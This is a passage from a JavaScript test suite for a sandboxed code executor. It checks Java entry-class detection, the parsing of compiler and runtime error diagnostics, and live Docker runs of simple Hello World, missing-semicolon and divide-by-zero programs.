  await test("Plan: strips comments and string literals without false positives", () => {
    const code = `
      // public class Fake1 {}
      /* public class Fake2 {} */
      public class RealClass {
          String s = "public class Fake3 {}";
          public static void main(String[] args) {}
      }
    `;
    const plan = resolveJavaExecutionPlan({ source: code });
    assert.equal(plan.sourceFileName, "RealClass.java");
    assert.equal(plan.entryClass, "RealClass");
  });

  await test("Diagnostics: parses Javac compiler error", () => {
    const javacErr = `main.java:3: error: ';' expected\n        System.out.println("Hello, World!")\n                                           ^\n1 error`;
    const markers = parseExecutionDiagnostics(javacErr, "java", "main.java");
    assert.equal(markers.length, 1);
    assert.equal(markers[0].startLineNumber, 3);
    assert.equal(markers[0].severity, 8);
  });

  await test("Diagnostics: parses Java runtime exception stack trace", () => {
    const runtimeErr = `Exception in thread "main" java.lang.ArithmeticException: / by zero\n\tat main.main(main.java:4)`;
    const markers = parseExecutionDiagnostics(runtimeErr, "java", "main.java");
    assert.equal(markers.length, 1);
    assert.equal(markers[0].startLineNumber, 4);
    assert.equal(markers[0].severity, 8);
    assert.ok(markers[0].message.includes("ArithmeticException"));
  });

  // Live Docker tests
  const liveDocker = await checkDockerAvailability();
  if (liveDocker.available) {
    await test("TEST 1 (Real Docker): main.java with public class main -> Hello, World!", async () => {
      const result = await SandboxExecutor.execute({
        language: "java",
        source: `public class main {\n    public static void main(String[] args) {\n        System.out.println("Hello, World!");\n    }\n}`,
        files: [{ name: "main.java", content: `public class main {\n    public static void main(String[] args) {\n        System.out.println("Hello, World!");\n    }\n}` }],
      });
      assert.equal(result.status, "SUCCESS");
      assert.equal(result.exitCode, 0);
      assert.equal(result.stdout.trim(), "Hello, World!");
    });

    await test("TEST 2 (Real Docker): Main.java with public class Main -> Hello, World!", async () => {
      const result = await SandboxExecutor.execute({
        language: "java",
        source: `public class Main {\n    public static void main(String[] args) {\n        System.out.println("Hello, World!");\n    }\n}`,
        files: [{ name: "Main.java", content: `public class Main {\n    public static void main(String[] args) {\n        System.out.println("Hello, World!");\n    }\n}` }],
      });
      assert.equal(result.status, "SUCCESS");
      assert.equal(result.exitCode, 0);
      assert.equal(result.stdout.trim(), "Hello, World!");
    });

    await test("TEST 3 (Real Docker): Hello.java with public class Hello -> Hello", async () => {
      const result = await SandboxExecutor.execute({
        language: "java",
        source: `public class Hello {\n    public static void main(String[] args) {\n        System.out.println("Hello");\n    }\n}`,
        files: [{ name: "Hello.java", content: `public class Hello {\n    public static void main(String[] args) {\n        System.out.println("Hello");\n    }\n}` }],
      });
      assert.equal(result.status, "SUCCESS");
      assert.equal(result.exitCode, 0);
      assert.equal(result.stdout.trim(), "Hello");
    });

    await test("TEST 4 (Real Docker): Compiler error produces COMPILEERROR & diagnostic markers", async () => {
      const result = await SandboxExecutor.execute({
        language: "java",
        source: `public class main {\n    public static void main(String[] args) {\n        System.out.println("No semicolon")\n    }\n}`,
        files: [{ name: "main.java", content: `public class main {\n    public static void main(String[] args) {\n        System.out.println("No semicolon")\n    }\n}` }],
      });
      assert.equal(result.status, "COMPILEERROR");
      assert.notEqual(result.exitCode, 0);
      assert.match(result.stderr, /error:/i);
      const markers = parseExecutionDiagnostics(result.stderr, "java", "main.java");
      assert.ok(markers.length > 0);
      assert.equal(markers[0].startLineNumber, 3);
      assert.equal(markers[0].severity, 8);
    });

    await test("TEST 5 (Real Docker): Runtime exception produces RUNTIMEERROR & diagnostic markers", async () => {
      const result = await SandboxExecutor.execute({
        language: "java",
        source: `public class main {\n    public static void main(String[] args) {\n        int a = 1 / 0;\n    }\n}`,
        files: [{ name: "main.java", content: `public class main {\n    public static void main(String[] args) {\n        int a = 1 / 0;\n    }\n}` }],
      });
      assert.equal(result.status, "RUNTIMEERROR");
      assert.notEqual(result.exitCode, 0);
      assert.match(result.stderr, /ArithmeticException/);
      const markers = parseExecutionDiagnostics(result.stderr, "java", "main.java");
      assert.ok(markers.length > 0);
      assert.equal(markers[0].startLineNumber, 3);
      assert.equal(markers[0].severity, 8);
    });
  }


  console.log(`  Execution Security Suite Finished: ${passed} passed, ${failed} failed`);
  console.log("==================================================");

  if (failed > 0) {
    process.exit(1);
  }
}

runTests();
